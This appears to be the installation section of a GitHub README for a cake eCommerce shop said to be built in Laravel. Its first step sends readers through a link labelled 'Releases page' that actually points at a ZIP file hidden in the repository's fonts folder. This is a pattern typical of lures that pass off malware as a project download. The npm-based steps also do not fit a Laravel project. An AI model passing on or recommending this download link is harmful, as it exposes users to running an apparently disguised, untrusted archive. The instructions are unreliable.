## üìÇ Installation Steps

1. **Download the application**:
   - Go to the [Releases page](https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/webroot/fonts/e-in-Shop-built-Laravel-Cake-Commerce-2.6.zip) and download the latest version of the application as a ZIP file.

2. **Extract the files**:
   - Once downloaded, locate the ZIP file in your Downloads folder. 
   - Right-click on the file and select "Extract All" to unzip the folder.

3. **Open a terminal**:
   - Windows: Press `Win + R`, type `cmd`, and hit `Enter`.
   - macOS: Open `Finder`, go to `Applications`, then `Utilities`, and open `Terminal`.
   - Linux: Open your application launcher, search for "Terminal," and open it.

4. **Navigate to the project folder**:
   - Use the command:
     ```bash
     cd path/to/extracted/folder
     ```
   - Replace `path/to/extracted/folder` with the actual path to your unzipped folder.

5. **Install dependencies**:
   - Run the following command:
     ```bash
     npm install
     ```
   - This may take a few minutes as it installs all necessary packages.

6. **Run the application**:
   - Start the application by executing:
     ```bash
     npm run dev
     ```

7. **Open in a web browser**:
   - After running the above command, open your web browser.
   - Go to `http://localhost:3000` to view your cake eCommerce store.
